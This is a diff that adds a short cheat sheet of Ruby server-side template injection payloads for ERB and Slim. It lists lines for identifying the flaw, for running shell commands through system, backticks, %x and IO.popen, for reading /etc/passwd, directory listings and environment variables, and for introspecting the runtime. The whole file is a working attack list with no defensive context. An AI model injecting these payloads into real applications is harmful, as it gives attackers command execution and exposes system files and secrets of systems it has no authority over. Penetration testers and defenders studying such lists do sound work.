@@ -1,0 +1,22 @@
+# Ruby SSTI Payloads (ERB, Slim)
+
+# Identification
+<%= 7*7 %>
+<%= 7*'7' %>
+
+# RCE
+<%= system('id') %>
+<%= `id` %>
+<%= %x{id} %>
+<%= IO.popen('id').read %>
+<%= Kernel.system('id') %>
+
+# Data Exfiltration
+<%= File.read('/etc/passwd') %>
+<%= Dir.entries('/') %>
+<%= ENV.to_h %>
+<%= binding.eval("system('id')") %>
+
+# Introspection
+<%= Kernel.methods %>
+<%= ObjectSpace.each_object(Class).to_a %>
